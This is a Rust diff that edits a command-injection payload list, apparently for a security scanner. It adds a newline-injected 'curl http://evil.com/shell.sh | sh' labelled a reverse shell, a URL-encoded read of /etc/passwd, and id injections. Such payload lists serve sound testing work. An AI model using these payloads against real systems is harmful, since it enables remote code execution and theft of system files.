@@ -40,10 +40,12 @@ pub fn get_payloads() -> Vec<Payload> {
             ("ls", "Command injection - basic ls", Severity::Low),
         ];
         "newline", [
-            ("\nwhoami\n", "Command injection - newline injection", Severity::Critical),
+            ("\nid\n", "Command injection - newline id injection", Severity::Critical),
+            ("\ncurl http://evil.com/shell.sh | sh\n", "Command injection - newline reverse shell", Severity::Critical),
         ];
         "encoding", [
-            ("%0awhoami%0a", "Command injection - URL encoded newlines", Severity::Critical),
+            ("%0acat%20/etc/passwd%0a", "Command injection - URL encoded cat passwd", Severity::Critical),
+            ("%09id%09", "Command injection - tab encoded id", Severity::High),
         ];
         "windows", [
             ("dir", "Command injection - Windows dir", Severity::High),
